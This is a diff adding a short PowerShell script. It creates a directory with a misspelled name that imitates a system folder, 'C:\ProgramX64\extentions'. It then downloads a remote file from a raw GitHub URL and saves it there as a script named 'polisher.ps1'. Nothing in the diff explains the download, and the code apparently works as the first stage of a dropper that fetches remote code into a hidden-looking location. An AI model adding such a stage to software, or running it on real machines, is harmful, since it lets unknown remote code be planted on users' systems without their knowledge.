@@ -1,0 +1,21 @@
+# Define the target directory and file path
+$directory = "C:\ProgramX64\extentions"
+$filePath = Join-Path $directory "polisher.ps1"
+$url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/update"
+
+try {
+    # Create the directory if it does not exist
+    if (-not (Test-Path -Path $directory)) {
+        New-Item -ItemType Directory -Path $directory -Force | Out-Null
+        Write-Host "Created directory: $directory" -ForegroundColor Cyan
+    }
+
+    # Fetch the content from the URL and save it to the file
+    Write-Host "Fetching content from URL..." -ForegroundColor Yellow
+    Invoke-WebRequest -Uri $url -OutFile $filePath
+
+    Write-Host "Successfully created and populated $filePath" -ForegroundColor Green
+}
+catch {
+    Write-Error "An error occurred: $_"
+}
